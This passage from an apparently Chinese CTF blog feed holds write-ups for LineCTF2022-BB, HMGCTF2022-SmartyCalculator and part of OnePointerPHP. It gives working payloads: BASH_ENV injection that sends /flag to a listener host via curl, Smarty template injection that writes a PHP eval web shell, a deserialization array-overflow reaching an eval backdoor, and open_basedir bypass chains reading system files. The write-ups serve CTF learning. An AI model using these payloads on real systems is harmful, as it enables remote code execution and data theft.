<pre class="line-numbers language-none"><code class="language-none">proc/1/environ;/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230907194522274.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.huli.tw/2022/03/27/linectf-2022-writeup/">https://blog.huli.tw/2022/03/27/linectf-2022-writeup/</a></p>
<p><a href="https://blog.csdn.net/weixin_60581972/article/details/127122199">https://blog.csdn.net/weixin_60581972/article/details/127122199</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>目录遍历</tag>
        <tag>python代码审计</tag>
        <tag>CVE-2021-23336（web缓存投毒）</tag>
      </tags>
  </entry>
  <entry>
    <title>LineCTF2022-BB</title>
    <url>/posts/b6fd9de0.html</url>
    <content><![CDATA[<h1 id="LineCTF2022-BB"><a href="#LineCTF2022-BB" class="headerlink" title="LineCTF2022-BB"></a>LineCTF2022-BB</h1><p>知识点概要：环境变量注入</p>
<p>主页显示源码</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">bye</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$ptn</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$ptn</span><span class="token punctuation">,</span> <span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>	<span class="token comment">#$s中有$ptn则返回false</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>	<span class="token comment">#遍历env变量键值对，键给$k，值给$v</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/=/i"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/[a-zA-Z]/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$k</span><span class="token punctuation">}</span></span>=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$v</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">#键过滤等号，值过滤大小写字母</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -c 'imdude'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/=/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$k</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>关键代码如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"env"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=&gt;</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>	<span class="token comment">#遍历env变量键值对，键给$k，值给$v</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/=/i"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">bye</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"/[a-zA-Z]/i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$k</span><span class="token punctuation">}</span></span>=<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$v</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">#键过滤等号，值过滤大小写字母</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"bash -c 'imdude'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>参考P神两篇文章</p>
<p><a href="https://twitter.com/phithon_xg/status/1495367705825722368">https://twitter.com/phithon_xg/status/1495367705825722368</a></p>
<p><a href="https://tttang.com/archive/1450/#toc_0x06-bash_env">https://tttang.com/archive/1450/#toc_0x06-bash_env</a></p>
<p>利用如下环境变量注入</p>
<pre class="line-numbers language-none"><code class="language-none">BASH_ENV='$(id 1&gt;&amp;2)' bash -c 'echo hello'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这个Bash命令的执行过程是:</p>
<ol>
<li>设置BASH_ENV环境变量，其值为 ‘$(id 1&gt;&amp;2)’</li>
<li>该环境变量会在新bash shell启动时被执行</li>
<li>bash -c ‘echo hello’ 会启动一个新的非交互式的bash shell</li>
<li>在该shell启动时，会先执行BASH_ENV变量的值 ‘$(id 1&gt;&amp;2)’</li>
<li>该代码会执行id命令，并将输出重定向到标准错误流stderr</li>
<li>然后再执行echo hello，输出hello到标准输出流stdout</li>
<li>该子shell执行完成后退出</li>
</ol>
<p>所以命令的最终效果是：</p>
<p>在标准错误流中输出id命令的用户信息，在标准输出流中输出hello</p>
<p>这利用了BASH_ENV变量在启动新bash shell时会被执行的特性。这样可以在新shell执行前，通过BASH_ENV注入预设的代码。</p>
<p>另外，为了绕过bye()函数对大小写字母的过滤，可用八进制的格式替换字母</p>
<p>例如<code>$'\101' = A</code></p>
<p>用python替换就是先将字母转成十进制再转成八进制</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; oct(ord("A"))
'0o101'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>再从第三位截取到末尾</p>
<pre class="line-numbers language-none"><code class="language-none">&gt;&gt;&gt; oct(ord("A"))[2:]
'101'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>执行命令要考虑中间的空格问题，空格也进行转换，执行命令会报错</p>
<p><code>cat /flag</code>可以被转换成如下两种格式</p>
<pre class="line-numbers language-none"><code class="language-none">$'\143\141\164' /$'\146\154\141\147'
或
$'\143'$'\141'$'\164' /$'\146'$'\154'$'\141'$'\147'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>两种格式都可顺利被执行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230809144800876.png"></p>
<p>但为了写脚本方便，选用第二种格式，只需对每个小写字母统一处理。脚本如下</p>
<pre class="line-numbers language-none"><code class="language-none">import string

cmd = "cat /flag | curl -d @- http://x.x.x.x:9876"
str = ''
for i in cmd:
    if i in string.ascii_lowercase:
        j = oct(ord(i))[2:]
        str += "$'\\"+j+"'"
    else:
        str+=i

print(str)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>命令解释：</p>
<pre class="line-numbers language-none"><code class="language-none">curl -d @- http://x.x.x.x:9876  #通过POST方式发送数据到指定的URL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>最终payload，GET传参（记得先在自己的x.x.x.x开启监听）</p>
<pre class="line-numbers language-none"><code class="language-none">?env[BASH_ENV]=`$'\143'$'\141'$'\164' /$'\146'$'\154'$'\141'$'\147' | $'\143'$'\165'$'\162'$'\154' -$'\144' @- $'\150'$'\164'$'\164'$'\160'://x.x.x.x:9876`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230809145648276.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/RABCDXB/article/details/125351004">https://blog.csdn.net/RABCDXB/article/details/125351004</a></p>
<p><a href="https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/">https://blog.maple3142.net/2022/03/27/line-ctf-2022-writeups/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>php代码审计</tag>
        <tag>环境变量注入</tag>
      </tags>
  </entry>
  <entry>
    <title>HMGCTF2022-SmartyCalculator</title>
    <url>/posts/e61f7f25.html</url>
    <content><![CDATA[<h1 id="HMGCTF2022-SmartyCalculator"><a href="#HMGCTF2022-SmartyCalculator" class="headerlink" title="HMGCTF2022-SmartyCalculator"></a>HMGCTF2022-SmartyCalculator</h1><p>知识点概要：Smarty模板注入</p>
<p>主页</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815171937631.png"></p>
<p>随便输入会弹窗提示：你还没有登录</p>
<p><a href="http://www.zip源码泄露,smarty框架/">www.zip源码泄露，Smarty框架</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815172201288.png"></p>
<p>index.php发现弹窗逻辑代码</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815172413115.png"></p>
<p>绕过弹窗，需要：1. POST传入data参数；2. Cookie要有login字段</p>
<p>然后还要绕过waf对data参数的限制（不能有<code>php</code>、<code>&lt;</code>、<code>flag</code>、<code>?</code>），才能进入Smart模板</p>
<p>题目Smarty版本是<code>3.1.39</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815170213285.png"></p>
<h2 id="思路1"><a href="#思路1" class="headerlink" title="思路1"></a>思路1</h2><p><a href="https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html">https://srcincite.io/blog/2021/02/18/smarty-template-engine-multiple-sandbox-escape-vulnerabilities.html</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815180335796.png"></p>
<p>从官方下载对应版本：<a href="https://github.com/smarty-php/smarty/releases?q=3.1.39&amp;expanded=true">https://github.com/smarty-php/smarty/releases?q=3.1.39&amp;expanded=true</a></p>
<p>对比发现<code>smarty_internal_compile_function.php</code>有改动（此处对比工具为<code>Beyond Compare</code>）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815103521724.png"></p>
<p>关键的差异只有一处正则（左侧为题目源码，右侧为官方源码）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815103852608.png"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z0-9_\x80-\xff](.*)+$/'</span><span class="token punctuation">,</span> <span class="token variable">$_name</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>题目正则逻辑分析：</p>
<ol>
<li><code>[a-zA-Z0-9_\x80-\xff]</code>匹配字母、数字、下划线或0x80-0xff范围内的任意字节，作为开头字符。</li>
<li><code>(.*)+</code>匹配0次或多次(*)任意数量(+)除换行符\n之外的任意单字符(.)。</li>
<li>$匹配字符串的结束。</li>
</ol>
<p>其中正则里<code>\x80-\xff</code>表示匹配utf-8编码下所有的汉字</p>
<p>所以可以换行绕过，<code>%0A</code>既不在前面的<code>[]</code>匹配里面，又不被后面的<code>.</code>匹配</p>
<p>所以只需要在原来poc基础上，加上<code>%0A</code>绕过即可（实际测试发现需要两个字符，且只要第一个字符是<code>%0A</code>皆可，此处用<code>%0A%0A</code>）</p>
<pre class="line-numbers language-none"><code class="language-none">data={function+name='rce(){};system("id");function%0A%0A'}{/function}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>HackBar传参如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815182749317.png"></p>
<p>执行phpinfo()</p>
<pre class="line-numbers language-none"><code class="language-none">data={function+name='rce(){};@eval($_POST[1]);function%0A%0A'}{/function}&amp;1=phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815183401988.png"></p>
<p>读flag</p>
<pre class="line-numbers language-none"><code class="language-none">data={function+name='rce(){};@eval($_POST[1]);function%0A%0A'}{/function}&amp;1=var_dump(file_get_contents('/flag'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815184109598.png"></p>
<h2 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h2><p><code>function.math.php</code>文件里有eval()函数可以命令执行，回溯<code>$equation</code>变量有个正则匹配</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815140049432.png"></p>
<pre class="line-numbers language-none"><code class="language-none">preg_match_all('!(?:0x[a-fA-F0-9]+)|([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)!', $equation, $match);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>正则逻辑分析如下：</p>
<ol>
<li><code>preg_match_all()</code>函数使用正则表达式匹配<code>$equation</code>字符串；</li>
<li>模式使用<code>! !</code>作为定界符；</li>
<li>第一部分 <code>(?:0x[a-fA-F0-9]+)</code> 匹配十六进制数，<code>?:</code>表示不捕获；</li>
<li>第二部分<code>([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)</code>捕获变量名模式（以字母/下划线/0x7f-0xff范围内的字符开头，后跟0个或多个字母/数字/指定字符的模式）。</li>
<li><code>|</code>表示或，匹配两种模式之一。</li>
<li>结果存储在$match数组中。</li>
<li>第一部分不捕获，第二部分捕获的变量名存入 $match[1]。</li>
<li>这样可以检索出字符串中的变量名，进行后续处理。</li>
</ol>
<p>根据上述逻辑，此处可通过八进制绕过正则</p>
<p>脚本如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入字符串:"</span><span class="token punctuation">)</span>

res <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    <span class="token keyword">if</span> c <span class="token operator">==</span> <span class="token string">"("</span> <span class="token keyword">or</span> c <span class="token operator">==</span> <span class="token string">")"</span> <span class="token keyword">or</span> c <span class="token operator">==</span> <span class="token string">","</span><span class="token punctuation">:</span>
        res <span class="token operator">+=</span> c
    <span class="token keyword">elif</span> c <span class="token operator">==</span> <span class="token string">"\""</span><span class="token punctuation">:</span>
        res <span class="token operator">+=</span> <span class="token string">"\\"</span> <span class="token operator">+</span> c
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        o <span class="token operator">=</span> <span class="token builtin">oct</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
        res <span class="token operator">+=</span> <span class="token string">"\\\\"</span> <span class="token operator">+</span> o<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如下命令写入一句话木马</p>
<pre class="line-numbers language-none"><code class="language-none">("file_put_contents")("wa0er.php","&lt;?php eval($_POST[wa0er]);?&gt;")<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>处理成八进制后，完整Payload如下</p>
<pre class="line-numbers language-none"><code class="language-none">data={$poc="poc"}{math equation="(\"\\146\\151\\154\\145\\137\\160\\165\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163\")(\"\\167\\141\\60\\145\\162\\56\\160\\150\\160\",\"\\74\\77\\160\\150\\160\\40\\145\\166\\141\\154(\\44\\137\\120\\117\\123\\124\\133\\167\\141\\60\\145\\162\\135)\\73\\77\\76\")"}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>HackBar传参如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815155251679.png"></p>
<p>蚁剑连接，flag在根目录</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230815154931684.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/m0_51078229/article/details/123660344">https://blog.csdn.net/m0_51078229/article/details/123660344</a></p>
<p><a href="https://xz.aliyun.com/t/11085">https://xz.aliyun.com/t/11085</a></p>
<p><a href="https://blog.csdn.net/RABCDXB/article/details/123750375">https://blog.csdn.net/RABCDXB/article/details/123750375</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>php代码审计</tag>
        <tag>Smarty模板注入</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝帽杯2021-OnePointerPHP</title>
    <url>/posts/48d4210.html</url>
    <content><![CDATA[<h1 id="蓝帽杯2021-OnePointerPHP"><a href="#蓝帽杯2021-OnePointerPHP" class="headerlink" title="蓝帽杯2021-OnePointerPHP"></a>蓝帽杯2021-OnePointerPHP</h1><p>知识点概要：基础反序列化、PHP数组key溢出、<code>open_basedir</code>绕过、SSRF攻击FPM服务、被动FTP、SUID权限</p>
<p>题目有源码，首页只有一张图</p>
<p><code>add_api.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"user.php"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token variable">$count</span><span class="token punctuation">[</span><span class="token operator">++</span><span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$count</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
		<span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token operator">+=</span><span class="token number">1</span><span class="token punctuation">;</span>
		<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"backdoor"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
	<span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span>
	<span class="token variable">$user</span><span class="token operator">-&gt;</span><span class="token property">count</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>user.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$count</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对于<code>add_api.php</code>，目标是执行第九行<code>eval($_GET["backdoor"]);</code>，但是正常逻辑：</p>
<p>第4行增加 user 对象的 count 属性值，并将自增后的值赋值给 $count 数组中的一个元素。必然会使第5行if条件为true，那么就必然执行不到第9行。（注意第5行if是赋值运算，不是比较运算）</p>
<h2 id="PHP数组key溢出"><a href="#PHP数组key溢出" class="headerlink" title="PHP数组key溢出"></a>PHP数组key溢出</h2><p>此时就是基础的反序列化和数组key溢出的问题</p>
<p>数组key溢出参考：<a href="https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/">https://two.github.io/2015/09/15/PHP-array-hash-key-overflow/</a></p>
<p>可在本地用如下代码测试观察，数组key只有为<code>9223372036854775807</code>时会如下图报错（测试版本为php7.4.3），从而可以使得题目源码中if条件为flase</p>
<blockquote>
<p>64位操作系统int型（带符号整型）数据范围是<code>-2的63次方 ~ 2的63次方-1</code>，计算机组成原理 数据表示的知识</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">9223372036854775807</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921111038041.png"></p>
<p>所以序列化代码如下（因为<code>data</code>值是从COOKIE获取，所以最后需要url编码）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">{</span>
	<span class="token keyword">public</span> <span class="token variable">$count</span><span class="token operator">=</span><span class="token number">9223372036854775806</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//O:4:"User":1:{s:5:"count";i:9223372036854775806;}</span>
<span class="token comment">//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>请求包头部Cookie字段，data值传入序列化数据，同时GET传参如下（此处笔者用Hackbar完成传参）</p>
<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=phpinfo();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921103348766.png"></p>
<p>接着想用如下代码直接读flag读不到，返回false</p>
<pre class="line-numbers language-none"><code class="language-none">?backdoor=var_dump(file_get_contents("/flag"));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="open-basedir绕过"><a href="#open-basedir绕过" class="headerlink" title="open_basedir绕过"></a>open_basedir绕过</h2><p>看phpinfo页面，<code>open_basedir</code>设置在<code>/var/www/html</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921141023229.png"></p>
<p><code>open_basedir</code>功能及绕过参考：<a href="https://www.cnblogs.com/LLeaves/p/13210005.html">https://www.cnblogs.com/LLeaves/p/13210005.html</a></p>
<p>四种思路：</p>
<ul>
<li><p>命令执行函数（如system()函数）绕过；</p>
</li>
<li><p>软链接（如symlink()函数）绕过；</p>
</li>
<li><p>glob伪协议绕过；</p>
</li>
<li><p>利用<code>ini_set</code>绕过。</p>
</li>
</ul>
<p>但题目phpinfo中过滤了一些函数，如下图</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921141911692.png"></p>
<p>此处利用<code>ini_set</code>绕过，构造如下payload绕过<code>open_basedir</code>列出根目录下的文件（传参时不能有注释）</p>
<pre class="line-numbers language-none"><code class="language-none">mkdir('wa0er'); 
chdir('wa0er');
ini_set('open_basedir','..');
chdir('..');	#相当于"../"
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
var_dump(scandir('./'));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行成功后，右键查看源码能让结果更加可视化</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921145256756.png"></p>
<p>还是无法直接读flag，可能是当前用户权限不够。查看<code>php.ini</code>如下</p>
<pre class="line-numbers language-none"><code class="language-none">mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/usr/local/etc/php/php.ini'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921145730532.png"></p>
<p>有个<code>easy_bypass.so</code>，文件名的提示意味就很强，据说预期题解是Pwn这个so然后来获取flag。</p>
<p>其实做到这里也想过绕过disable_functions直接RCE，我们可以通过挂载恶意so的方式来突破disable_function来实现RCE，挂载so的方法有两种：</p>
<ul>
<li>dl()函数挂载（dl被ban）；</li>
<li>直接写入配置文件的extension中。</li>
</ul>
<p>但是这里好像都不可行，所以只能另寻思路。</p>
<p>查看当前进程完整命令文件<code>/proc/self/cmdline</code></p>
<pre class="line-numbers language-none"><code class="language-none">mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents('/proc/self/cmdline'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

